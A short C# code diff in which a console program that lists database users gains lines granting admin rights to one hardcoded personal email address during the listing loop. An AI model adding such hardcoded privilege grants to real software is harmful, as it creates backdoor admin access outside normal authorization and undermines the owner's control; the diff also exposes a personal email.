@@ -38,6 +38,16 @@ class Program
                 foreach (User user in users)
                 {
                     Console.WriteLine($"  - ID: {user.UserId}, Email: {user.Email}, Name: {user.FirstName} {user.LastName}");
+                    
+                    // Make the user admin if they're not already
+                    if (!user.IsAdmin && user.Email == "massirrmassirr7@gmail.com")
+                    {
+                        bool adminResult = db.MakeUserAdmin(user.Email);
+                        if (adminResult)
+                        {
+                            Console.WriteLine($"  ✅ Made {user.Email} an admin");
+                        }
+                    }
                 }
             }
             else
